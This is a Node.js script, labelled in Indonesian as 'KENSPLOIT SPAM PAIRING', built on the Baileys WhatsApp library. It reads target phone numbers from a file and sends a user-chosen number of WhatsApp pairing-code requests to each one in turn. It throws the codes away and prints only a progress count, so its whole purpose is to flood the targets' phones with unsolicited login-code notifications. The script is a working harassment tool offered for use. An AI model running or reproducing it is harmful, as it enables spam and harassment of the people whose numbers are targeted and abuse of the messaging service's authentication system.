const { default: makeWASocket, useMultiFileAuthState } = require("@whiskeysockets/baileys");
const pino = require('pino');
const readline = require("readline");
const fs = require('fs'); // Required to read the file

const color = [
    '\x1b[31m', 
    '\x1b[32m', 
    '\x1b[33m', 
    '\x1b[34m', 
    '\x1b[35m', 
    '\x1b[36m', 
    '\x1b[37m',
    '\x1b[90m' 
];
const xeonColor = color[Math.floor(Math.random() * color.length)];

const xColor = '\x1b[0m';

const question = (text) => {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    return new Promise((resolve) => { rl.question(text, resolve) });
};

async function XeonProject() {
    const { state } = await useMultiFileAuthState('./69/session');
    const XeonBotInc = makeWASocket({
        logger: pino({ level: "silent" }),
        printQRInTerminal: false,
        auth: state,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 0,
        keepAliveIntervalMs: 10000,
        emitOwnEvents: true,
        fireInitQueries: true,
        generateHighQualityLinkPreview: true,
        syncFullHistory: true,
        markOnlineOnConnect: true,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
    });

    try {
        // Read phone numbers from no.txt
        const phoneNumbers = fs.readFileSync('no.txt', 'utf-8').split('\n').map(num => num.trim()).filter(num => num);
        
        if (phoneNumbers.length === 0) {
            console.log('No targets found in no.txt');
            return;
        }

        // Request the desired number of pairing codes
        const xeonCodes = parseInt(await question(xeonColor + 'Jumlah : ' + xColor));

        if (isNaN(xeonCodes) || xeonCodes <= 0) {
            console.log('Please enter a valid number greater than 0.');
            return;
        }

        // Round-robin generation of pairing codes
        for (let i = 0; i < xeonCodes; i++) {
            const targetIndex = i % phoneNumbers.length; // Get current target based on round-robin
            const phoneNumber = phoneNumbers[targetIndex];

            try {
                let code = await XeonBotInc.requestPairingCode(phoneNumber);
                code = code?.match(/.{1,4}/g)?.join("-") || code;
                console.log(xeonColor + `${phoneNumber} [${i + 1}/${xeonCodes}]` + xColor);
            } catch (error) {
                console.error('Error:', error.message);
            }
        }
    } catch (error) {
        console.error('Error:', error.message);
    }

    return XeonBotInc;
}

console.log(xeonColor + `BERHASIL LOGIN...
KENSPLOIT SPAM PAIRING
=========================
IKUTI PERINTAH DI BAWAH
UNTUK MELAKUKAN SPAM
=> MASUKAN JUMLAH
[ LAKUKAN PERINTAH DI ATAS SEKARANG ] ` + xColor);

XeonProject();
